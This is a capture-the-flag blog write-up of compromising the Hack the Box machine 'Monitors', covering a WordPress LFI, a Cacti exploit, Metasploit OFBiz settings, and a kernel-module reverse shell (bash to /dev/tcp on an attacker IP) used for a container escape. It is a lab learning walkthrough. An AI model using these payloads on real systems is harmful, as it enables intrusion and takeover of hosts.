+++
author = "Nick"
categories = ["hack the box", "Linux", "Hard", "ofBiz", "port forwarding", "meterpreter", "LFI", "cacti", "reverse shell", "container", "container escape", "cap_sys_module"]
date = 2021-10-09T15:00:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2021/09/monitors.png"
slug = "hack-the-box-monitors"
tags = ["hack the box", "Linux", "Hard", "ofBiz", "port forwarding", "meterpreter", "LFI", "cacti", "reverse shell", "container", "container escape", "cap_sys_module"]
title = "Hack the Box - Monitors"

+++


Welcome back! Today we are doing the Hack the Box machine - Monitors. This machine is listed as a Hard Linux machine. Let's jump in.

As always, we kick it off with an `nmap` scan of all the ports. Here are the results:

```
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When we visit port 80, we see that the hostname is leaked in the 'error' message.

![](/images/2021/09/image-1.png)

We can add `monitors.htb` to our host file. When we visit the hostname we get a `wordpress` site.

![](/images/2021/09/image-2.png)

We can scan a `wordpress` site for vulns using `wpscan`. 

Command:
`wpscan --api-token <API KEY HERE> --url http://monitors.htb -e --plugins-detection aggressive -o wpscan.log `

The results come back with quite a few vulnerabilities. As we scroll through the list, from the bottom up we see a plugin with a `Unauthenticated File Inclusion` - https://www.exploit-db.com/exploits/44544.

We can simply test this by copy / pasting the `lfi` path onto the url.

![](/images/2021/09/image-3.png)

We can open up `Burpsuite` and start to enumerate the directories. A quick Google shows us that `wp-config.php` is readable file. Trial and error gets us the following LFI path.

`//wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php `

This gets us the config and a username / password combo. We try to use these for `SSH` but no dice. We use `Burpsuite`'s `Intruder` function to help us enumerate possible exploit paths. Eventually we find `sites-available` location with the default `000-default.conf` file that shows we should add `cacti-admin.monitors.htb` as a valid host location. We add this to our hostfile and see whatt's being hosted.

![](/images/2021/09/image-4.png)

After trying a few combinations, we use `admin` and `BestAdministrator@2020!` to get logged into `Cacti`. A quick Google search shows we have one possible exploit - https://www.exploit-db.com/exploits/49810.

We start up a `netcat` listener on `4444` and fire the script off with all the defaults. After quite a few attempts we get a shell back!

![](/images/2021/09/image-5.png)

Now that we're on the system, we can start to enumerate. We can copy over `linpeas` and see what comes up when we run it. The machine did not have `curl` or `wget` so we need to transfer it via `netcat`.

Receive command:
`nc 10.10.14.93 8080 > lin.sh`

Send command:
`nc -lvnp 8080 < linp.sh`

Once the file is over, we give it a run. We see some potential additional services running on the box. We know it's in a container, now we need to figure out how to break out.

![](/images/2021/09/image-6.png)

There is so much data that it's hard for `linpeas` to make much sense of it. One item that is interesting is that we can see the files in `marcus`'s home directory.

![](/images/2021/09/image-7.png)

This generally means we can view and list other things there as well. When we head to his directory, we see a `.backup` folder. The folder is missing `r` permissions but for some reason has execute? After a while of sifting through the `linpeas` log, I started to look at files associated to backups.

![](/images/2021/09/image-8.png)

This service is worth checking out and we have the ability to read it. Inside that file, we see a reference to what's inside the `.backup` folder!

![](/images/2021/09/image-9.png)

Now let's try to read the `backup.sh` file!

![](/images/2021/09/image-10.png)

Inside this file, we have another username / password combo. We know that the user `cacti_backup` isn't a thing, so we try to `SSH` in as `marcus` with the above password, and we are in!

![](/images/2021/09/image-11.png)

Now that we are in as `marcus`, we can look at the `note.txt` file in his directory.

![](/images/2021/09/image-12.png)

`phpinfo` gives us general information about the running version - [see here](https://www.php.net/manual/en/function.phpinfo.php). So there is something about the running version of PHP that we are not meant to see. We rerun `linpeas` as `marcus` and see something familiar, port 8443.

![](/images/2021/09/image-13.png)

There is no local `curl` or `wget` on the system. So we can transfer over the `curl` binary - downloaded from [here](https://github.com/moparisthebest/static-curl/releases/tag/v7.79.0). Next we transfer it via `netcat`.

Command:
Receiving file - `nc -lvnp 6969 > curl`
Sending file - `nc 10.10.10.238 6969 < curl-amd64`

Next we give some execute permissions with `+x`. Now with `curl` on the system, we can check to see what's on port 8443.

Command:
`./curl https://127.0.0.1:8443 -v -k`

```
*   Trying 127.0.0.1:8443...
* Connected to 127.0.0.1 (127.0.0.1) port 8443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: none
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server did not agree to a protocol
* Server certificate:
*  subject: C=US; ST=DE; L=Wilmington; O=Apache Software Fundation; OU=Apache OFBiz; CN=ofbiz-vm.apache.org; emailAddress=dev@ofbiz.apache.org
*  start date: May 30 08:43:19 2014 GMT
*  expire date: May 27 08:43:19 2024 GMT
*  issuer: C=US; ST=DE; L=Wilmington; O=Apache Software Fundation; OU=Apache OFBiz; CN=ofbiz-vm.apache.org; emailAddress=dev@ofbiz.apache.org
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
> GET / HTTP/1.1
> Host: 127.0.0.1:8443
> User-Agent: curl/7.79.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 
< Content-Type: text/html;charset=utf-8
< Content-Language: en
< Content-Length: 713
< Date: Wed, 22 Sep 2021 01:16:12 GMT
< 
* Connection #0 to host 127.0.0.1 left intact
<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> Not found</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/9.0.31</h3></body></html
```

We get back a basic 404, but the important part here is the certificate. It's `ofBiz` running on `Apache Tomcat 9.0.31`. Some googling around and we see a few exploits. We even have a `Metasploit` module. In order to get this to work, we need to forward the ports to our machine since we cannot access them directly.

Command:
`ssh -L 8443:127.0.0.1:8443 marcus@10.10.10.238`

Now with the port being forwarded, let's see if the `Metasploit` module will work. There are a few settings that need to be set:

`set rhost 127.0.0.1`
`set rport 8443`
`set lhost tun0`
`set lport 8443`
`set srvport 9090`
`set forceexploit true`

With all these setup, we shoot it off and...

![](/images/2021/09/image-14.png)

We get a shell as root! We're not clear yet, we take a look and don't see our rootflag anywhere. Looks like we need to break from the container! We'll upload `linpeas` again and run it as root this time.

Command:
`upload linp.sh`
`shell`
`chmod +x linp.sh`
`./linp.sh`

Now when we run `linpeas` as root, there can often be a lot of noise to sift through. Eventually, we check this listing:

![](/images/2021/09/image-15.png)

Hacktricks has a [good listing](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#container-capabilities) of checking for Docker breakout scenarios. We indeed have `cap_sys_module`. There have been a few write-ups on this kind of break out. 

AttackDefense has modules where you can actually do this exact attack. I've done some of there CTF write-ups as well, take a peek!

So let's break out. Here's our [reference document](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd). We need to make the shell file, a make file and then compile them.

First, the make file. We simple create a new file called `Makefile` with the following contents:

```
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Now, we make our binary the same way, here's that code:

```
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.163/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
Note we changed the IP to our machine.

Now we can upload them both to our target machine via our `Meterpreter` session.

Commands:
`upload reverse-shell.c`
`upload Makefile`

![](/images/2021/09/image-16.png)

Now with both files on the target, we drop back into a shell session. We will use the `make` command to make things..

Command:
`make`

![](/images/2021/09/image-17.png)

Now we can start our `netcat` listener.

Command:
`nc -lvnp 4444`

Now we simply call `insmod reverse-shell.ko` and we should see our listener light up! 

Command:
`insmod reverse-shell.ko`

Boom, we get an error....

![](/images/2021/09/image-18.png)

This simply means the module has already been loaded into the kernel. We need to remove the loaded module with `rmmod`

Command:
`rmmod reverse-shell.ko`

We check again to verify that it's removed.

Command:
`lsmod | grep reverse`

Nothing, now we can try loading it again!

Command:
`rmmod reverse-shell.ko`

![](/images/2021/09/image-19.png)

Our listener lights up and we have a connection to the host machine!

![](/images/2021/09/image-20.png)

Another box down! See you again next time!



